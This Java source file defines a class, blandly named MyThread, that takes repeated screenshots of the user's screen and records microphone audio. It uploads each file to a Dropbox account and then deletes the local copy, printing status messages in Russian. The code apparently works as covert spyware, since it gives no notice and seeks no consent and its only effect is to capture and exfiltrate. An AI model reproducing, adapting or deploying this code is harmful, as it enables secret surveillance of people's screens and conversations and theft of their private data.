import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import javax.sound.sampled.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {
    private Thread thread1 = new Thread();
    private Thread thread2 = new Thread();
    private DbxClientV2 client;
    private AudioFileFormat.Type fileType = AudioFileFormat.Type.WAVE;
    private DataLine.Info info = new DataLine.Info(TargetDataLine.class, getAudioFormat());
    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
    private TargetDataLine line;

    {
        try {
            line = (TargetDataLine) AudioSystem.getLine(info);
        } catch (LineUnavailableException e) {
            e.printStackTrace();
        }
    }

    public MyThread(DbxClientV2 client) {
        this.client = client;
    }

    public void letsStart() {
        run(client);
        recordAudio(5000);
    }

    private void run(DbxClientV2 client) {
        Thread thread = new Thread(() -> {
            for (int i = 0; i < 3; i++) {
                Robot robot = null;
                String fileName = dateFormat.format(new Date());
                try {
                    robot = new Robot();
                } catch (AWTException e) {
                    e.printStackTrace();
                }
                BufferedImage screenShot = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                File file = new File(fileName + ".JPG");
                try {

                    ImageIO.write(screenShot, "JPG", new File(file.getName()));
                    System.out.println("Screenshots is ready");
                } catch (IOException e) {
                    e.printStackTrace();
                }

                try {
                    String filePath = file.getAbsolutePath();
                    InputStream in = new FileInputStream(filePath);
                    client.files().uploadBuilder("/" + file.getName()).uploadAndFinish(in);
                    in.close();
                    if (file.delete()) {
                        System.out.println("Файл " + file.getName() + " удален.");
                    } else {
                        System.out.println("Фaйл yдaлить нe пoлyчилocь");
                    }
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
                try {
                    Thread.sleep(1000);

                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        thread.start();
    }

    private AudioFormat getAudioFormat() {
        float sampleRate = 16000;
        int sampleSizeInBits = 8;
        int channels = 2;
        boolean signed = true;
        boolean bigEndian = true;
        AudioFormat format = new AudioFormat(sampleRate, sampleSizeInBits, channels, signed, bigEndian);
        return format;
    }

    public void recordAudio(int milliseconds) {
        String fileName = "Rec_" + dateFormat.format(new Date()) + ".wav";
        File file = new File(fileName);
        start(file);
        stop(milliseconds, file);
    }

    private void start(File file) {
        Thread thread_start = new Thread(() -> {
            try {
                line.open(getAudioFormat());
                line.start();
                AudioInputStream ais = new AudioInputStream(line);
                AudioSystem.write(ais, fileType, file);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        });
        thread_start.start();
    }

    private void stop(int milliseconds, File file) {
        Thread thread_stop = new Thread(() -> {
            try {
                Thread.sleep(milliseconds);
                line.stop();
                line.close();
                System.out.println("Запись " + file.getName() + " завершена.");
                // recordAudio(milliseconds);
                try {
                    InputStream in = new FileInputStream(file.getAbsolutePath());
                    client.files().uploadBuilder("/" + file.getName()).uploadAndFinish(in);
                    in.close();
                    if (file.delete()) {
                        System.out.println("Файл " + file.getName() + " удален.");
                    } else {
                        System.out.println("Фaйл yдaлить нe пoлyчилocь");
                    }
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        });
        thread_stop.start();
    }
}
